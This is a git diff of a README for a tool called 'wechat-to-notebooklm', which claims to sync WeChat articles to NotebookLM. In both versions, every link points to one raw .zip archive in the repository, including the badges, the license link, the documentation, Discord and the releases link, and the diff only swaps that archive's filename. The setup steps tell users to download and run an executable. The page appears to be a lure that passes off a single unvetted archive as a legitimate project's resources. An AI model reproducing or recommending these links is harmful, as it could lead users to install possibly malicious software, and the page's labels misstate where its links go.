@@ -1,6 +1,6 @@
 # ✨ wechat-to-notebooklm - Sync WeChat Articles Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)
 
 <div align="center">
 
@@ -8,8 +8,8 @@
 
 **Automatically sync WeChat Official Account articles to Google NotebookLM for AI-powered analysis, summarization, and content generation**
 
-[![License: MIT](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)
-[![Claude Code](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)
+[![License: MIT](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)
+[![Claude Code](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)
 
 </div>
 
@@ -19,7 +19,7 @@ To start using this application, follow these simple steps. You don’t need any
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip) to download the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip) to download the latest version of the application.
 
 2. **Choose the Right File**: Look for the file that matches your operating system. For Windows, you may see an `.exe` file. For macOS, there may be a `.dmg` file.
 
@@ -63,12 +63,12 @@ If you encounter any issues, try the following:
 
 ## 📈 Contribution
 
-We welcome contributions to enhance the application. If you have ideas or improvements, feel free to submit a pull request or open an issue on the [GitHub repository](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip).
+We welcome contributions to enhance the application. If you have ideas or improvements, feel free to submit a pull request or open an issue on the [GitHub repository](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip).
 
 ## 🔗 Additional Resources
 
-- **User Documentation**: For in-depth guidance, check the [User Documentation](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip).
-- **Community Support**: Join our user community on [Discord](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip) for discussions and support.
+- **User Documentation**: For in-depth guidance, check the [User Documentation](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip).
+- **Community Support**: Join our user community on [Discord](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip) for discussions and support.
 
 ## 📣 Feedback
 
@@ -76,8 +76,8 @@ We appreciate your experience with this tool. Please share any feedback or sugge
 
 ## 📝 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip). Feel free to use and modify it as needed.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip). Feel free to use and modify it as needed.
 
 For any questions, please create an issue on the repository or contact us directly through our GitHub page.
 
-[![Download Latest Release](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/notebooklm_wechat_to_v2.6-alpha.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)](https://raw.githubusercontent.com/singajogijaswanth/wechat-to-notebooklm/main/rich/wechat-to-notebooklm-Phersephoneia.zip)
